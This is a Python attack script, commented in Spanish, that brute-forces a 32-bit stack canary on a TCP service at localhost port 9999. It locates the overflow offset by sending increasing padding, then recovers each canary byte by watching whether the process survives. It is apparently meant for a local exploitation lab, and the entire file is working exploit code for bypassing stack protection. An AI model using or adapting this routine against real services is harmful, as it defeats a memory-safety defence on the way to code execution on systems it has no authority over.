#!/usr/bin/env python3
import struct
import socket
 
HOST = "127.0.0.1"
PORT = 9999
TIMEOUT = 1.5

# 0xf4b59100

def test_payload(payload):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(TIMEOUT)
	s.connect((HOST, PORT))
	s.send(payload)
	try:
	    response = s.recv(1024)
	    s.close()
	    # Si recibimos respuesta ⇒ proceso sigue vivo ⇒ byte correcto
	    if len(response) > 0:
	    	print("El proceso sigue vivo")
	    	return True
	    else:
	    	return False
	except socket.timeout:
	    # No se recibió nada dentro del tiempo ⇒ probablemente se murió
	    s.close()
	    return False

def brute_canary(offset):
    canary = b"\x00"  # asumimos que el primer byte es \x00
    print(f"[*] Primer byte conocido del canario: {canary.hex()}")
    
    for i in range(1, 4):  # faltan 3 bytes
        for b in range(256):
            test_byte = canary + bytes([b])
            payload = b"A" * (offset-1) + test_byte
            
            if test_payload(payload):
                canary += bytes([b])
                print(f"[+] Byte {i+1} encontrado: {b:02x}")
                break
            else:
            	print(f"[*] Se probo el byte {i+1}: {test_byte.hex()}")
    return hex(int.from_bytes(canary, "little"))

def find_offset(min_offset):
	offset = 0
	print(f"Se busca el offset con el canario a partir de {min_offset}")
	for n in range(min_offset, min_offset+3):
		payload = b'A' * n
		print(f"Se prueba con un offset de {n}")
		if not test_payload(payload) :
			offset = n
			print(f"[OK] El offset es {offset}")
			break
	return offset
	
if __name__ == "__main__":
    print("[*] Iniciando brute-force del canario...")
    min_offset = 64
    offset = find_offset(min_offset)
    if not (offset > min_offset):
    	print("[ERROR] No se encuentra el offset correcto")
    else:
    	canary = brute_canary(offset)
    	print(f"[+] Canary encontrado: {canary}")
    	
    	
